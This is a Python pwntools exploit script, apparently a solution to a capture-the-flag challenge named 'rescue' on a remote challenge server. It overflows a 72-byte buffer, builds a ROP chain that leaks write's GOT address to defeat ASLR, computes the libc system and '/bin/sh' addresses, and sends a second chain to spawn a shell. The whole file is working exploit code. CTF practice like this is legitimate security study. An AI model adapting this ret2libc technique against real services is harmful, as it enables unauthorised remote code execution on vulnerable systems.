#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="amd64", os="linux", endian="little")
context.log_level="DEBUG"


class Pwn:
    def __init__(self):
        self.libc = ELF("./libc.so.6")
        self.e = ELF("./rescue")
        self.p = None

    def start_binary(self):
        self.p = remote("rescueshell.challs.malice.fr", 6060)
        self.p.recvuntil("Password: ")

    def leak_aslr(self):
        main_addr = self.e.symbols['main']
        write_plt = self.e.plt['write']
        write_got = self.e.got['write']
        pop_rdi=0x0000000000400a93
        pop_rsi_r15=0x0000000000400a91

        payload = p64(0x00000000004007A6)+p64(pop_rdi)+p64(0x1)+p64(pop_rsi_r15)+p64(write_got)+p64(0x41)+p64(write_plt)+p64(main_addr)
        self.p.sendline("A"*72+payload)
        data = self.p.recvuntil("Password: ")
        return u64(data[0:6]+"\x00"*2)

    def pwn_binary(self):
        pop_rdi=0x0000000000400a93

        self.start_binary()

        leak_write = self.leak_aslr()
        leak_system = leak_write - self.libc.symbols['write'] + self.libc.symbols['__libc_system']
        leak_binsh = leak_write - self.libc.symbols['write'] + next( self.libc.search('/bin/sh\x00'))

        payload = p64(pop_rdi)+p64(leak_binsh)+p64(leak_system)+p64(leak_system)
        self.p.interactive()
        self.p.sendline("A" * 72 + payload)

        self.p.interactive()
        self.p.close()


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
